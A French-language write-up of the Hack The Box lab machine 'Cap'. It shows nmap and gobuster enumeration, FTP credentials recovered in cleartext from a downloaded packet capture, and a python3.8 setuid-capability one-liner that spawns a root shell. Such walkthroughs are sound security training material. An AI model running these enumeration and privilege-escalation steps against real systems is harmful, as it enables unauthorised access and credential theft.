# Enumération de port

nmap cap.htb -sV -p-

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn

# Web 

Le site Web propose 4 interface: 
- Dashboard : Un tableau d'affichage avec des données relatives à la sécurité 
- Security Snapshot : Une interface permettant de télécharger un pcap des dernière 5 secondes 
- IP Config : Configuration IP de la machine
- Network Status : Etat des différentes connexion (en écoute, établis, ...)

## Enumération Web 

    gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt 

```
/data                 (Status: 302) [Size: 208] [--> http://cap.htb/]
/ip                   (Status: 200) [Size: 17447]                    
/netstat              (Status: 200) [Size: 30656]                    
/capture              (Status: 302) [Size: 220] [--> http://cap.htb/data/2]
```

### Enumération des possibles pcap 

    gobuster dir -u http://cap.htb/data/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard -b 302

Grâce à cet énumération je me rend compte qu'il existe une capture que je n'avais pas encore analysé: 0.pcap

    http://cap.htb/data/0

## Analyse de la capture

Je vois qu'il y a du trafic FTP et je décide donc de l'analyser (clic droit > Suivre le flux TPC).

Je trouve alors des identifiants:

    nathan:Buck3tH4TF0RM3!

Ces identifiants permettent de se connecter via ftp et SSH. 

# Escalade de privilège

Après avoir cherché un moment, le nom de la box (cap) nous fais penser aux capabilities. 
Un article décrit comment cela fonctionne et comment faire l'escalade: 

	https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

Nous concernant:
	getcap -r / 2>/dev/null

Nous donne:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

python3.8 possède la capabilite setuid, lui permettant de changer l'uid (on peut donc passer de l'uid 1001 à l'uid 0; cf: commande **id**) 

	python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
